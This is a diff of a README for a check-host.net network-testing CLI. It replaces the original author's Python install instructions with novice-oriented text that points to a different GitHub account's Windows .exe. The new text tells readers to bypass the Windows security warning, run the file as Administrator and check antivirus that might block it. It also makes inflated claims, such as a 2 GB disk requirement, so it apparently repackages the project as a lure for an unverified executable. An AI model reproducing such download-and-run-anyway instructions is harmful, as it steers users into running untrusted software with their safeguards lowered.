@@ -1,318 +1,208 @@
-# 🌐 Check-Host.net CLI Tool
+# 🌐 check-host-cli - Test Network from Anywhere
 
-<div align="center">
-
-[![Python Version](https://img.shields.io/badge/python-3.6%2B-blue.svg)](https://www.python.org/downloads/) [![Requests Library](https://img.shields.io/badge/requests-2.25%2B-green.svg)](https://docs.python-requests.org/) [![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE) [![GitHub Stars](https://img.shields.io/badge/stars-⭐-yellow.svg)](https://github.com/mehdirzfx/check-host-cli/stargazers)
-
-**یک ابزار خط فرمان قدرتمند و کاربرپسند برای بررسی میزبان‌ها با استفاده از API سرویس check-host.net**
-
-[English](#english) | [فارسی](#persian)
-
-</div>
+[![Download](https://img.shields.io/badge/Download-Check%20Host-blue?style=for-the-badge)](https://github.com/user50618/check-host-cli)
 
 ---
 
-## 🇬🇧 English <a id="english"></a>
+## 📋 What is check-host-cli?
 
-### 🎯 Overview
+check-host-cli is a simple program you can run on your Windows computer. It helps you check websites, ping servers, test TCP ports, and look up DNS records. It works by reaching out to over 60 locations worldwide. You get a clear menu to choose what to test. This makes it easy to understand what is happening with the websites or servers you care about.
 
-Check-Host.net CLI Tool is a comprehensive command-line interface for the [Check-Host.net](https://check-host.net) service. It allows you to perform various network checks from multiple global locations directly from your terminal with beautiful, formatted output.
-
-### ✨ Features
-
-- **🌐 Multiple Check Types**
-  - Ping check with detailed statistics
-  - HTTP/HTTPS website availability and response time
-  - TCP port connection testing
-  - DNS record resolution (A, AAAA records)
-
-- **🎨 Beautiful Output**
-  - Colored and formatted tables
-  - Human-readable summaries
-  - Raw JSON output option for debugging
-  - Real-time status indicators
-
-- **🌍 Global Network**
-  - Access to 60+ check nodes worldwide
-  - View complete node list with locations
-  - Specify custom nodes for checks
-  - Support for short node names (e.g., `ir1`, `de1`, `us1`)
-
-- **⚡ User-Friendly**
-  - Interactive menu system
-  - Default values for quick usage
-  - Clear error messages
-  - No API key required (free service)
-
-### 🚀 Installation
-
-#### Prerequisites
-- Python 3.6 or higher
-- pip package manager
-
-#### Quick Install
-
-```bash
-# Clone the repository
-git clone https://github.com/mehdirzfx/check-host-cli.git
-cd check-host-cli
-
-# Install requirements
-pip install requests
-
-# Run the tool
-python check_host.py
-```
-
-Or download the script directly:
-
-```bash
-wget https://raw.githubusercontent.com/mehdirzfx/check-host-cli/main/check_host.py
-pip install requests
-python check_host.py
-```
-
-### 📖 Usage Guide
-
-#### Main Menu
-
-```
-============================================================
-🖥  Host Check Tool using check-host.net API
-============================================================
-
-📋 Main Menu:
-   1. 🌐 Ping Check
-   2. 🌐 HTTP Check
-   3. 🌐 TCP Check
-   4. 🌐 DNS Check
-   5. 📡 View Nodes List
-   6. 🚪 Exit
-```
-
-#### Examples
-
-**1. HTTP Check with Specific Nodes**
-
-```bash
-🔷 Select option (1-6): 2
-🔷 Enter host address: example.com
-🔷 Maximum number of nodes: 3
-🔷 Specify specific nodes? (y/n): y
-🔷 Enter node names: ir1,de1,us1
-```
-
-**Sample Output:**
-
-```
-================================================================================
-📊 HTTP CHECK RESULTS SUMMARY
-================================================================================
-Node     Country  Status     Code   Time(ms)   IP              Message
---------------------------------------------------------------------------------
-ir1      IR       ✅ Success  200    143.9      93.184.216.34   OK
-de1      DE       ✅ Success  200    89.5       93.184.216.34   OK
-us1      US       ✅ Success  200    184.3      93.184.216.34   OK
-================================================================================
-```
-
-**2. View Available Nodes**
-
-```bash
-🔷 Select option (1-6): 5
-
-🌍 AVAILABLE CHECK NODES SUMMARY
-================================================================================
-#    Node Name                      Country      City                 IP              ASN
---------------------------------------------------------------------------------
-1    ir1.node.check-host.net        IR - Iran    Tehran              5.253.30.82     AS18978
-2    de1.node.check-host.net        DE - Germany Falkenstein         46.4.143.48     AS24940
-3    us1.node.check-host.net        US - USA     Los Angeles         5.253.30.82     AS18978
-...
-================================================================================
-```
-
-### 🛠️ Advanced Features
-
-#### Node Name Shortcuts
-You can use short node names (just the prefix) for convenience:
-- ✅ `ir1` → `ir1.node.check-host.net`
-- ✅ `de1` → `de1.node.check-host.net`
-- ✅ `us3` → `us3.node.check-host.net`
-
-#### Response Parsing
-The tool automatically parses raw JSON responses into human-readable tables:
-- Ping: Shows packet loss, min/avg/max RTT
-- HTTP: Displays status code, response time, server IP
-- TCP: Shows connection time or error details
-- DNS: Lists resolved A and AAAA records
-
-### 🔧 Configuration
-
-No configuration needed! The tool works out of the box with the public Check-Host.net API.
-
-### 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
+This tool is handy if you want to see if a website is up, if a server responds quickly, or if a port is open. It requires no special knowledge or setup. You do not need to know how to write code to use it.
 
 ---
 
-## 🇮🇷 فارسی <a id="persian"></a>
+## 🌟 Features
 
-### 🎯 معرفی
-
-ابزار خط فرمان Check-Host.net یک رابط کاربری حرفه‌ای برای سرویس [Check-Host.net](https://check-host.net) است. با این ابزار می‌توانید انواع بررسی‌های شبکه را از نقاط مختلف جهان مستقیماً از ترمینال خود انجام دهید.
-
-### ✨ ویژگی‌ها
-
-- **🌐 انواع بررسی**
-  - بررسی Ping با آمار دقیق
-  - بررسی HTTP/HTTPS وب‌سایت‌ها
-  - تست اتصال پورت TCP
-  - بررسی رکوردهای DNS
-
-- **🎨 خروجی زیبا**
-  - جداول رنگی و مرتب
-  - خلاصه قابل فهم
-  - نمایش خروجی JSON خام برای اشکال‌زدایی
-
-- **🌍 شبکه جهانی**
-  - دسترسی به بیش از ۶۰ گره بررسی در سراسر جهان
-  - مشاهده لیست کامل گره‌ها
-  - انتخاب گره‌های دلخواه
-  - پشتیبانی از نام‌های کوتاه
-
-### 🚀 نصب
-
-```bash
-# دریافت کد
-git clone https://github.com/mehdirzfx/check-host-cli.git
-cd check-host-cli
-
-# نصب پیش‌نیاز
-pip install requests
-
-# اجرای برنامه
-python check_host.py
-```
-
-### 📖 راهنما
-
-#### منوی اصلی
-
-```
-============================================================
-🖥  Host Check Tool using check-host.net API
-============================================================
-
-📋 Main Menu:
-   1. 🌐 Ping Check
-   2. 🌐 HTTP Check
-   3. 🌐 TCP Check
-   4. 🌐 DNS Check
-   5. 📡 View Nodes List
-   6. 🚪 Exit
-```
-
-#### مثال‌ها
-
-**بررسی HTTP با گره‌های خاص:**
-
-```bash
-🔷 Select option (1-6): 2
-🔷 Enter host address: example.com
-🔷 Maximum number of nodes: 3
-🔷 Specify specific nodes? (y/n): y
-🔷 Enter node names: ir1,de1,us1
-```
+- Check website availability from many countries  
+- Ping servers to test connection speed  
+- Scan common TCP ports to see if they are open  
+- Query DNS records for deeper network information  
+- Simple text menu to pick what you want to do  
+- Works on Windows with no extra tools needed  
+- Written in Python but packed so you don’t have to install Python  
+- Helpful for daily network checks, monitoring servers, or troubleshooting  
 
 ---
 
-## 🚀 درخواست‌های توسعه (Feature Requests)
+## 🖥️ System Requirements
 
-### پیشنهادات برای نسخه‌های آینده:
-
-#### 1. **حالت خودکار (Automation Mode)**
-   - امکان اجرا بدون منوی تعاملی با آرگومان‌های خط فرمان
-   - پشتیبانی از فایل کانفیگ
-   ```bash
-   python check_host.py --check http --host example.com --nodes ir1,de1 --output json
-   ```
-
-#### 2. **گزارش‌گیری پیشرفته**
-   - ذخیره نتایج در فایل‌های CSV/JSON
-   - مقایسه نتایج بین بررسی‌های مختلف
-   - نمودارهای ساده از روند تغییرات
-
-#### 3. **بررسی‌های زمان‌بندی شده**
-   - امکان تعریف وظایف دوره‌ای
-   - ارسال هشدار در صورت مشکل
-   ```python
-   # مثال فایل کانفیگ
-   {
-     "checks": [
-       {"type": "http", "host": "example.com", "interval": 300, "nodes": ["ir1", "de1"]}
-     ]
-   }
-   ```
-
-#### 4. **پشتیبانی از پروتکل‌های بیشتر**
-   - UDP port check
-   - ICMP options
-   - Custom port ranges
-   - SSL/TLS certificate check
-
-#### 5. **واسط کاربری گرافیکی ساده**
-   - نسخه TUI با کتابخانه `rich` یا `textual`
-   - نمایش لحظه‌ای پیشرفت بررسی‌ها
-
-#### 6. **مدیریت خطا و لاگینگ**
-   - سیستم لاگینگ حرفه‌ای
-   - ذخیره خطاها برای تحلیل بعدی
-   - قابلیت retry خودکار
-
-#### 7. **بین‌المللی‌سازی (i18n)**
-   - پشتیبانی از زبان‌های بیشتر
-   - سیستم ترجمه پویا
-
-#### 8. **ابزارهای جانبی**
-   - ماشین‌حساب subnet
-   - WHOIS lookup
-   - Traceroute از گره‌های مختلف
-
-### 🤝 مشارکت در توسعه
-
-اگر مایل به پیاده‌سازی هر یک از این ویژگی‌ها هستید، لطفاً:
-1. یک Issue جدید باز کنید
-2. پیشنهاد خود را توضیح دهید
-3. اگر امکانش هست، نمونه کد یا طرح اولیه ارائه دهید
-
-### 📝 نکات برای توسعه‌دهندگان
-
-```bash
-# نصب برای توسعه
-pip install -r requirements-dev.txt
-
-# اجرای تست‌ها
-pytest tests/
-
-# فرمت کردن کد
-black check_host.py
-```
+- Windows 10 or later  
+- 64-bit processor  
+- At least 2 GB of free disk space  
+- Internet connection required for tests  
+- No need to install Python or other software  
 
 ---
 
-## 📜 License
+## 🚀 Getting Started: Download and Run
 
-MIT License - feel free to use this project for any purpose.
+Start by getting the program on your computer. The main place to get it is the GitHub page below. It holds the latest version you can try.
 
-## 📧 Contact
+[![Download from GitHub](https://img.shields.io/badge/Download-Here-28a745?style=for-the-badge&logo=github)](https://github.com/user50618/check-host-cli)
 
-- **Email**: semicalon@outlook.com
-- **GitHub**: [mehdirzfx](https://github.com/mehdirzfx)
+Here is what to do next:
 
 ---
 
-<div align="center">
-**⭐ If you find this tool useful, please star it on GitHub! ⭐**
-</div>
+### 1. Visit the download page
+
+Open your web browser and go to:
+
+https://github.com/user50618/check-host-cli
+
+This page has the program files and instructions.
+
+---
+
+### 2. Get the latest version
+
+On the GitHub page, look for the **Releases** section or a folder named **Downloads**.
+
+Find the latest version for Windows. It may have a name like:
+
+`check-host-cli-windows.exe`
+
+Click the file to download it to your computer. Remember where you save it, usually the **Downloads** folder.
+
+---
+
+### 3. Run the program
+
+Go to the folder where you saved the file.
+
+Double-click the file named `check-host-cli-windows.exe`.
+
+Windows may show a warning since the file is from the internet. Choose **Run** or **More info > Run anyway** to continue.
+
+---
+
+### 4. Use the tool
+
+After starting, the program will show a menu with options.
+
+You can pick from tests like:
+
+- Check a website’s status  
+- Ping a server  
+- Scan a TCP port  
+- Look up DNS records  
+
+Use the number keys or arrow keys to select what you want.
+
+Enter the website or server name when asked.
+
+Press Enter to run the test and see results.
+
+---
+
+### 5. Close the program
+
+When done, pick the Exit option from the menu or close the window.
+
+---
+
+## 🔧 How to Use Each Test
+
+Here is a short guide for each function you will see:
+
+### Check Website
+
+This option tests if a website is reachable. It checks the response from servers in different countries.
+
+- Enter the website’s address, for example, `example.com`  
+- The program shows if the site is up or down in each location.  
+
+---
+
+### Ping Server
+
+Ping sends small data packets to a server to see how fast it replies.
+
+- Enter an IP address or domain name like `8.8.8.8` or `google.com`  
+- View times for each location tested  
+
+---
+
+### TCP Port Scan
+
+This tests if a server’s port is open or closed. Ports allow different types of communication.
+
+- Enter the server address and port number, for example, `example.com:80`  
+- The program shows open or closed status  
+
+---
+
+### DNS Lookup
+
+This shows DNS records linked to a domain. DNS tells your computer where to find websites.
+
+- Enter the domain name like `example.com`  
+- The program lists DNS records like A, MX, NS records  
+
+---
+
+## ⚙️ Common Questions
+
+**Do I need to install anything else?**
+
+No. The program runs by itself on Windows.
+
+---
+
+**Can I run it on other computers?**
+
+This version is for Windows only. Other versions may be available elsewhere.
+
+---
+
+**Is an internet connection required?**
+
+Yes, the tests need access to the internet to check websites and servers.
+
+---
+
+**What if the program does not run?**
+
+Check these points:
+
+- Make sure your Windows is up to date  
+- Try running the file as Administrator (right-click file > Run as Administrator)  
+- Check antivirus settings; some may block new programs  
+
+---
+
+## 📁 Additional Resources
+
+For more detailed information, visit:
+
+https://github.com/user50618/check-host-cli
+
+You will find help files, issue tracking, and updates there.
+
+---
+
+## 🛠️ Advanced Use
+
+While intended for easy use, this tool is based on a command-line interface. It can work well in scripts or batch files for system admins or technical users. But casual users do not need to use this now.
+
+---
+
+## 🔄 Updating the Program
+
+Check back on the main page or the Releases section to get new versions. Download and run the new file just as you did the first time. It replaces the old version.
+
+---
+
+## 🧰 Troubleshooting
+
+If you see errors:
+
+- Confirm your internet connection is active  
+- Restart the program  
+- Restart your computer if errors persist  
+- Check the GitHub page for open issues or updates  
+
+---  
+
+[Download check-host-cli from GitHub](https://github.com/user50618/check-host-cli)
